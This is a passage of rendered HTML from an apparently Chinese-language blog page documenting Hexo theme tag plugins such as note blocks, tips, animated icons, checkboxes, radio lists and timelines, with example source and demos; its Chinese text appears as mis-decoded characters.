modern"><p>primary æç¤ºå—æ ‡ç­¾</p></div><div class="note success modern"><p>success æç¤ºå—æ ‡ç­¾</p></div><div class="note info modern"><p>info æç¤ºå—æ ‡ç­¾</p></div><div class="note warning modern"><p>warning æç¤ºå—æ ‡ç­¾</p></div><div class="note danger modern"><p>danger æç¤ºå—æ ‡ç­¾</p></div><p>3.<code>flat</code>æ ·å¼</p><div class="note flat"><p>é»˜è®¤ æç¤ºå—æ ‡ç­¾</p></div><div class="note default flat"><p>default æç¤ºå—æ ‡ç­¾</p></div><div class="note primary flat"><p>primary æç¤ºå—æ ‡ç­¾</p></div><div class="note success flat"><p>success æç¤ºå—æ ‡ç­¾</p></div><div class="note info flat"><p>info æç¤ºå—æ ‡ç­¾</p></div><div class="note warning flat"><p>warning æç¤ºå—æ ‡ç­¾</p></div><div class="note danger flat"><p>danger æç¤ºå—æ ‡ç­¾</p></div><p>4.<code>disabled</code>æ ·å¼</p><div class="note disabled"><p>é»˜è®¤ æç¤ºå—æ ‡ç­¾</p></div><div class="note default disabled"><p>default æç¤ºå—æ ‡ç­¾</p></div><div class="note primary disabled"><p>primary æç¤ºå—æ ‡ç­¾</p></div><div class="note success disabled"><p>success æç¤ºå—æ ‡ç­¾</p></div><div class="note info disabled"><p>info æç¤ºå—æ ‡ç­¾</p></div><div class="note warning disabled"><p>warning æç¤ºå—æ ‡ç­¾</p></div><div class="note danger disabled"><p>danger æç¤ºå—æ ‡ç­¾</p></div><p>5.<code>no-icon</code>æ ·å¼</p><div class="note no-icon flat"><p>é»˜è®¤ æç¤ºå—æ ‡ç­¾</p></div><div class="note default no-icon flat"><p>default æç¤ºå—æ ‡ç­¾</p></div><div class="note primary no-icon flat"><p>primary æç¤ºå—æ ‡ç­¾</p></div><div class="note success no-icon flat"><p>success æç¤ºå—æ ‡ç­¾</p></div><div class="note info no-icon flat"><p>info æç¤ºå—æ ‡ç­¾</p></div><div class="note warning no-icon flat"><p>warning æç¤ºå—æ ‡ç­¾</p></div><div class="note danger no-icon flat"><p>danger æç¤ºå—æ ‡ç­¾</p></div>              </div>            </details><details class="folding-tag" blue><summary> 2.å¤–éƒ¨icon </summary>              <div class='content'>              <p>1.<code>simple</code>æ ·å¼</p><div class="note icon-padding simple"><i class="note-icon fab fa-cc-visa"></i><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note blue icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>2021å¹´å¿«åˆ°äº†â€¦</p></div><div class="note pink icon-padding simple"><i class="note-icon fas fa-car-crash"></i><p>å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š</p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-fan"></i><p>è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ</p></div><div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note purple icon-padding simple"><i class="note-icon far fa-hand-scissors"></i><p>å‰ªåˆ€çŸ³å¤´å¸ƒ</p></div><div class="note green icon-padding simple"><i class="note-icon fab fa-internet-explorer"></i><p>å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨</p></div><p>2.<code>modern</code>æ ·å¼</p><div class="note icon-padding modern"><i class="note-icon fab fa-cc-visa"></i><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>2021å¹´å¿«åˆ°äº†â€¦</p></div><div class="note pink icon-padding modern"><i class="note-icon fas fa-car-crash"></i><p>å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š</p></div><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ</p></div><div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>å‰ªåˆ€çŸ³å¤´å¸ƒ</p></div><div class="note green icon-padding modern"><i class="note-icon fab fa-internet-explorer"></i><p>å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨</p></div><p>3.<code>flat</code>æ ·å¼</p><div class="note icon-padding flat"><i class="note-icon fab fa-cc-visa"></i><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note blue icon-padding flat"><i class="note-icon fas fa-bullhorn"></i><p>2021å¹´å¿«åˆ°äº†â€¦</p></div><div class="note pink icon-padding flat"><i class="note-icon fas fa-car-crash"></i><p>å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š</p></div><div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ</p></div><div class="note orange icon-padding flat"><i class="note-icon fas fa-battery-half"></i><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>å‰ªåˆ€çŸ³å¤´å¸ƒ</p></div><div class="note green icon-padding flat"><i class="note-icon fab fa-internet-explorer"></i><p>å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨</p></div><p>4.<code>disabled</code>æ ·å¼</p><div class="note icon-padding disabled"><i class="note-icon fab fa-cc-visa"></i><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note blue icon-padding disabled"><i class="note-icon fas fa-bullhorn"></i><p>2021å¹´å¿«åˆ°äº†â€¦</p></div><div class="note pink icon-padding disabled"><i class="note-icon fas fa-car-crash"></i><p>å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š</p></div><div class="note red icon-padding disabled"><i class="note-icon fas fa-fan"></i><p>è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ</p></div><div class="note orange icon-padding disabled"><i class="note-icon fas fa-battery-half"></i><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note purple icon-padding disabled"><i class="note-icon far fa-hand-scissors"></i><p>å‰ªåˆ€çŸ³å¤´å¸ƒ</p></div><div class="note green icon-padding disabled"><i class="note-icon fab fa-internet-explorer"></i><p>å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨</p></div><p>5.<code>no-icon</code>æ ·å¼</p><div class="note no-icon flat"><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note blue no-icon flat"><p>2021å¹´å¿«åˆ°äº†â€¦</p></div><div class="note pink no-icon flat"><p>å°å¿ƒå¼€è½¦ å®‰å…¨è‡³ä¸Š</p></div><div class="note red no-icon flat"><p>è¿™æ˜¯ä¸‰ç‰‡å‘¢ï¼Ÿè¿˜æ˜¯å››ç‰‡ï¼Ÿ</p></div><div class="note orange no-icon flat"><p>ä½ æ˜¯åˆ· Visa è¿˜æ˜¯ UnionPay</p></div><div class="note purple no-icon flat"><p>å‰ªåˆ€çŸ³å¤´å¸ƒ</p></div><div class="note green no-icon flat"><p>å‰ç«¯æœ€è®¨åŒçš„æµè§ˆå™¨</p></div>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-5-ä¸Šæ ‡æ ‡ç­¾-tip">2.5 ä¸Šæ ‡æ ‡ç­¾ tip</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">é…ç½®å‚æ•°</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [å‚æ•°ï¼Œå¯é€‰] %&#125;æ–‡æœ¬å†…å®¹&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>æ ·å¼</code>: success,error,warning,bolt,ban,home,sync,cogs,key,bell</li><li><code>è‡ªå®šä¹‰å›¾æ ‡</code>: æ”¯æŒfontawesomeã€‚</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip %&#125;default&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip info %&#125;info&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip success %&#125;success&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip error %&#125;error&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip warning %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bolt %&#125;bolt&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban %&#125;ban&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip home %&#125;home&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip sync %&#125;sync&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip cogs %&#125;cogs&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip key %&#125;key&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip bell %&#125;bell&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip fa-atom %&#125;è‡ªå®šä¹‰font awesomeå›¾æ ‡&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><div class="tip "><p>default</p></div><div class="tip info"><p>info</p></div><div class="tip success"><p>success</p></div><div class="tip error"><p>error</p></div><div class="tip warning"><p>warning</p></div><div class="tip bolt"><p>bolt</p></div><div class="tip ban"><p>ban</p></div><div class="tip home"><p>home</p></div><div class="tip sync"><p>sync</p></div><div class="tip cogs"><p>cogs</p></div><div class="tip key"><p>key</p></div><div class="tip bell"><p>bell</p></div><div class="tip fa-atom"><p>è‡ªå®šä¹‰font awesomeå›¾æ ‡</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-6-åŠ¨æ€æ ‡ç­¾-anima">2.6 åŠ¨æ€æ ‡ç­¾ anima</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">é…ç½®å‚æ•°</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip [å‚æ•°ï¼Œå¯é€‰] %&#125;æ–‡æœ¬å†…å®¹&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><div class="note info flat"><ol><li>å°†æ‰€éœ€çš„CSSç±»æ·»åŠ åˆ°å›¾æ ‡ï¼ˆæˆ–DOMä¸­çš„ä»»ä½•å…ƒç´ ï¼‰ã€‚</li><li>å¯¹äºçˆ¶çº§æ‚¬åœæ ·å¼ï¼Œéœ€è¦ç»™ç›®æ ‡å…ƒç´ æ·»åŠ æŒ‡å®šCSSç±»ï¼ŒåŒæ—¶è¿˜è¦ç»™ç›®æ ‡å…ƒç´ çš„çˆ¶çº§å…ƒç´ æ·»åŠ CSSç±»<code>faa-parent animated-hover</code>ã€‚ï¼ˆè¯¦æƒ…è§ç¤ºä¾‹åŠç¤ºä¾‹æºç ï¼‰<br>You can regulate the speed of the animation by adding the CSS class or . faa-fastfaa-slow</li><li>å¯ä»¥é€šè¿‡ç»™ç›®æ ‡å…ƒç´ æ·»åŠ CSSç±»<code>faa-fast</code>æˆ–<code>faa-slow</code>æ¥æ§åˆ¶åŠ¨ç”»å¿«æ…¢ã€‚</li></ol></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><p>1.On DOM loadï¼ˆå½“é¡µé¢åŠ è½½æ—¶æ˜¾ç¤ºåŠ¨ç”»ï¼‰</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>2.è°ƒæ•´åŠ¨ç”»é€Ÿåº¦</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated faa-fast %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated faa-slow %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>3.On hoverï¼ˆå½“é¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºåŠ¨ç”»ï¼‰</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-horizontal animated-hover %&#125;warning&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-flash animated-hover %&#125;ban&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><p>4.On parent hoverï¼ˆå½“é¼ æ ‡æ‚¬åœåœ¨çˆ¶çº§å…ƒç´ æ—¶æ˜¾ç¤ºåŠ¨ç”»ï¼‰</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% tip warning faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-horizontal&quot;</span>&gt;</span></span>warning<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br><span class="line">&#123;% tip ban faa-parent animated-hover %&#125;<span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;faa-flash&quot;</span>&gt;</span></span>ban<span class="language-xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>&#123;% endtip %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><p>1.On DOM loadï¼ˆå½“é¡µé¢åŠ è½½æ—¶æ˜¾ç¤ºåŠ¨ç”»ï¼‰</p><div class="tip warning faa-horizontal animated"><p>warning</p></div><div class="tip ban faa-flash animated"><p>ban</p></div>2.è°ƒæ•´åŠ¨ç”»é€Ÿåº¦<div class="tip warning faa-horizontal animated faa-fast"><p>warning</p></div><div class="tip ban faa-flash animated faa-slow"><p>ban</p></div>3.On hoverï¼ˆå½“é¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºåŠ¨ç”»ï¼‰<div class="tip warning faa-horizontal animated-hover"><p>warning</p></div><div class="tip ban faa-flash animated-hover"><p>ban</p></div>4.On parent hoverï¼ˆå½“é¼ æ ‡æ‚¬åœåœ¨çˆ¶çº§å…ƒç´ æ—¶æ˜¾ç¤ºåŠ¨ç”»ï¼‰<div class="tip warning faa-parent animated-hover"><p class="faa-horizontal">warning</p></div><div class="tip ban faa-parent animated-hover"><p class="faa-flash">ban</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-7-å¤é€‰åˆ—è¡¨-checkbox">2.7 å¤é€‰åˆ—è¡¨ checkbox</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">é…ç½®å‚æ•°</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox æ ·å¼å‚æ•°ï¼ˆå¯é€‰ï¼‰, æ–‡æœ¬ï¼ˆæ”¯æŒç®€å•mdï¼‰ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>æ ·å¼</code>: plus, minus, times</li><li><code>é¢œè‰²</code>: red,yellow,green,cyan,blue,gray</li><li><code>é€‰ä¸­çŠ¶æ€</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% checkbox çº¯æ–‡æœ¬æµ‹è¯• %&#125;</span><br><span class="line">&#123;% checkbox checked, æ”¯æŒç®€å•çš„ [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) è¯­æ³• %&#125;</span><br><span class="line">&#123;% checkbox red, æ”¯æŒè‡ªå®šä¹‰é¢œè‰² %&#125;</span><br><span class="line">&#123;% checkbox green checked, ç»¿è‰² + é»˜è®¤é€‰ä¸­ %&#125;</span><br><span class="line">&#123;% checkbox yellow checked, é»„è‰² + é»˜è®¤é€‰ä¸­ %&#125;</span><br><span class="line">&#123;% checkbox cyan checked, é’è‰² + é»˜è®¤é€‰ä¸­ %&#125;</span><br><span class="line">&#123;% checkbox blue checked, è“è‰² + é»˜è®¤é€‰ä¸­ %&#125;</span><br><span class="line">&#123;% checkbox plus green checked, å¢åŠ  %&#125;</span><br><span class="line">&#123;% checkbox minus yellow checked, å‡å°‘ %&#125;</span><br><span class="line">&#123;% checkbox times red checked, å‰ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><div class='checkbox'><input type="checkbox" />            <p>çº¯æ–‡æœ¬æµ‹è¯•</p>            </div><div class='checkbox checked'><input type="checkbox" checked="checked"/>            <p>æ”¯æŒç®€å•çš„ <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> è¯­æ³•</p>            </div><div class='checkbox red'><input type="checkbox" />            <p>æ”¯æŒè‡ªå®šä¹‰é¢œè‰²</p>            </div><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>ç»¿è‰² + é»˜è®¤é€‰ä¸­</p>            </div><div class='checkbox yellow checked'><input type="checkbox" checked="checked"/>            <p>é»„è‰² + é»˜è®¤é€‰ä¸­</p>            </div><div class='checkbox cyan checked'><input type="checkbox" checked="checked"/>            <p>é’è‰² + é»˜è®¤é€‰ä¸­</p>            </div><div class='checkbox blue checked'><input type="checkbox" checked="checked"/>            <p>è“è‰² + é»˜è®¤é€‰ä¸­</p>            </div><div class='checkbox plus green checked'><input type="checkbox" checked="checked"/>            <p>å¢åŠ </p>            </div><div class='checkbox minus yellow checked'><input type="checkbox" checked="checked"/>            <p>å‡å°‘</p>            </div><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>å‰</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-8-å•é€‰åˆ—è¡¨-radio">2.8 å•é€‰åˆ—è¡¨ radio</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">é…ç½®å‚æ•°</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio æ ·å¼å‚æ•°ï¼ˆå¯é€‰ï¼‰, æ–‡æœ¬ï¼ˆæ”¯æŒç®€å•mdï¼‰ %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>é¢œè‰²</code>: red,yellow,green,cyan,blue,gray</li><li><code>é€‰ä¸­çŠ¶æ€</code>: checked</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% radio çº¯æ–‡æœ¬æµ‹è¯• %&#125;</span><br><span class="line">&#123;% radio checked, æ”¯æŒç®€å•çš„ [<span class="string">markdown</span>](<span class="link">https://guides.github.com/features/mastering-markdown/</span>) è¯­æ³• %&#125;</span><br><span class="line">&#123;% radio red, æ”¯æŒè‡ªå®šä¹‰é¢œè‰² %&#125;</span><br><span class="line">&#123;% radio green, ç»¿è‰² %&#125;</span><br><span class="line">&#123;% radio yellow, é»„è‰² %&#125;</span><br><span class="line">&#123;% radio cyan, é’è‰² %&#125;</span><br><span class="line">&#123;% radio blue, è“è‰² %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -4"><div class='checkbox'><input type="radio" />            <p>çº¯æ–‡æœ¬æµ‹è¯•</p>            </div><div class='checkbox checked'><input type="radio" checked="checked"/>            <p>æ”¯æŒç®€å•çš„ <a href="https://guides.github.com/features/mastering-markdown/">markdown</a> è¯­æ³•</p>            </div><div class='checkbox red'><input type="radio" />            <p>æ”¯æŒè‡ªå®šä¹‰é¢œè‰²</p>            </div><div class='checkbox green'><input type="radio" />            <p>ç»¿è‰²</p>            </div><div class='checkbox yellow'><input type="radio" />            <p>é»„è‰²</p>            </div><div class='checkbox cyan'><input type="radio" />            <p>é’è‰²</p>            </div><div class='checkbox blue'><input type="radio" />            <p>è“è‰²</p>            </div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="2-9-æ—¶é—´è½´-timeline">2.9 æ—¶é—´è½´ timeline</h2><div class="tabs" id="åˆ†æ "><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#åˆ†æ -1">æ ‡ç­¾è¯­æ³•</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -2">é…ç½®å‚æ•°</button></li><li class="tab"><button type="button" data-href="#åˆ†æ -3">ç¤ºä¾‹æºç </button></li><li class="tab"><button type="button" data-href="#åˆ†æ -4">æ¸²æŸ“æ¼”ç¤º</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="åˆ†æ -1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline æ—¶é—´çº¿æ ‡é¢˜ï¼ˆå¯é€‰ï¼‰[,color] %&#125;</span><br><span class="line">&lt;!-- timeline æ—¶é—´èŠ‚ç‚¹ï¼ˆæ ‡é¢˜ï¼‰ --&gt;</span><br><span class="line">æ­£æ–‡å†…å®¹</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline æ—¶é—´èŠ‚ç‚¹ï¼ˆæ ‡é¢˜ï¼‰ --&gt;</span><br><span class="line">æ­£æ–‡å†…å®¹</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -2"><ol><li><code>title</code>:æ ‡é¢˜/æ—¶é—´çº¿</li><li><code>color</code>:<code>timeline</code>é¢œè‰²:default(ç•™ç©º) / blue / pink / red / purple / orange / green</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="åˆ†æ -3"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;% timeline æ—¶é—´è½´æ ·å¼,blue %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-07-24 [<span class="string">2.6.6 -&gt; 3.0</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> å¦‚æœæœ‰ <span class="code">`hexo-lazyload-image`</span> æ’ä»¶ï¼Œéœ€è¦åˆ é™¤å¹¶é‡æ–°å®‰è£…æœ€æ–°ç‰ˆæœ¬ï¼Œè®¾ç½® <span class="code">`lazyload.isSPA: true`</span>ã€‚</span><br><span class="line"><span class="bullet">2.</span> 2.x ç‰ˆæœ¬çš„ css å’Œ js ä¸é€‚ç”¨äº 3.x ç‰ˆæœ¬ï¼Œå¦‚æœä½¿ç”¨äº† <span class="code">`use_cdn: true`</span> åˆ™éœ€è¦åˆ é™¤ã€‚</span><br><span class="line"><span class="bullet">3.</span> 2.x ç‰ˆæœ¬çš„ fancybox æ ‡ç­¾åœ¨ 3.x ç‰ˆæœ¬ä¸­è¢«é‡å‘½åä¸º gallery ã€‚</span><br><span class="line"><span class="bullet">4.</span> 2.x ç‰ˆæœ¬çš„ç½®é¡¶ <span class="code">`top: true`</span> æ”¹ä¸ºäº† <span class="code">`pin: true`</span>ï¼Œå¹¶ä¸”åŒæ ·é€‚ç”¨äº <span class="code">`layout: page`</span> çš„é¡µé¢ã€‚</span><br><span class="line"><span class="bullet">5.</span> å¦‚æœä½¿ç”¨äº† <span class="code">`hexo-offline`</span> æ’ä»¶ï¼Œå»ºè®®å¸è½½ï¼Œ3.0 ç‰ˆæœ¬é»˜è®¤å¼€å¯äº† pjax æœåŠ¡ã€‚</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-05-15 [<span class="string">2.6.3 -&gt; 2.6.6</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.6</span>) --&gt;</span><br><span class="line"></span><br><span class="line">ä¸éœ€è¦é¢å¤–å¤„ç†ã€‚</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 2020-04-20 [<span class="string">2.6.2 -&gt; 2.6.3</span>](<span class="link">https://github.com/volantis-x/hexo-theme-volantis/releases/tag/2.6.3</span>) --&gt;</span><br><span class="line"></span><br><span class="line"><span class="bullet">1.</span> å…¨å±€æœç´¢ <span 